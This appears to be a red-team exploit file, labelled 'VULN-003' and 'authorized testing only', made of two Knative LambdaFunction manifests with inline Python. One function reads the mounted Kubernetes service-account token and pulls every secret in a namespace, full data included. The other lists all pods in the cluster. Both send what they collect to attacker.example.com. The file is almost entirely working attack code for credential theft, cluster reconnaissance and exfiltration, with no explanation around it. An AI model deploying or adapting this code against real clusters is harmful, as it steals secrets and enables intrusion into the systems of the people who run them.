# VULN-003: Arbitrary Code Execution - Kubernetes API Access
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit uses the service account token to interact with
# the Kubernetes API from within the Lambda function.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-003-k8s-api-secrets
  labels:
    redteam: "true"
    exploit: "vuln-003"
    target: "k8s-secrets"
  annotations:
    redteam.knative.io/description: "Access K8s API to list secrets"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import urllib.request
        
        # Kubernetes API endpoint
        K8S_API = "https://kubernetes.default.svc"
        TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        
        def handler(event):
            """List secrets using service account token"""
            try:
                # Read token
                with open(TOKEN_PATH, 'r') as f:
                    token = f.read().strip()
                
                # Create SSL context with CA
                ssl_context = ssl.create_default_context()
                ssl_context.load_verify_locations(CA_PATH)
                
                # List secrets in current namespace
                namespace = event.get('namespace', 'default')
                url = f"{K8S_API}/api/v1/namespaces/{namespace}/secrets"
                
                req = urllib.request.Request(url)
                req.add_header('Authorization', f'Bearer {token}')
                
                with urllib.request.urlopen(req, context=ssl_context) as response:
                    secrets = json.loads(response.read())
                
                # Exfiltrate secrets
                exfil_data = {
                    'namespace': namespace,
                    'secret_names': [s['metadata']['name'] for s in secrets.get('items', [])],
                    'secrets': secrets  # Full secret data!
                }
                
                # Send to attacker
                payload = json.dumps(exfil_data).encode('utf-8')
                exfil_req = urllib.request.Request(
                    'http://attacker.example.com/collect/secrets',
                    data=payload,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(exfil_req, timeout=5)
                
                return {"status": "success", "count": len(secrets.get('items', []))}
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-003-k8s-api-pods
  labels:
    redteam: "true"
    exploit: "vuln-003"
    target: "k8s-pods"
  annotations:
    redteam.knative.io/description: "List all pods in cluster"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import urllib.request
        
        K8S_API = "https://kubernetes.default.svc"
        TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        
        def handler(event):
            """List all pods across namespaces"""
            try:
                with open(TOKEN_PATH, 'r') as f:
                    token = f.read().strip()
                
                ssl_context = ssl.create_default_context()
                ssl_context.load_verify_locations(CA_PATH)
                
                # List ALL pods (if RBAC allows)
                url = f"{K8S_API}/api/v1/pods"
                
                req = urllib.request.Request(url)
                req.add_header('Authorization', f'Bearer {token}')
                
                with urllib.request.urlopen(req, context=ssl_context) as response:
                    pods = json.loads(response.read())
                
                # Extract pod info
                pod_info = []
                for pod in pods.get('items', []):
                    pod_info.append({
                        'name': pod['metadata']['name'],
                        'namespace': pod['metadata']['namespace'],
                        'ip': pod.get('status', {}).get('podIP'),
                        'node': pod.get('spec', {}).get('nodeName'),
                        'containers': [c['image'] for c in pod.get('spec', {}).get('containers', [])]
                    })
                
                # Exfiltrate
                payload = json.dumps({'pods': pod_info}).encode('utf-8')
                exfil_req = urllib.request.Request(
                    'http://attacker.example.com/collect/pods',
                    data=payload,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(exfil_req, timeout=10)
                
                return {"status": "success", "pod_count": len(pod_info)}
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
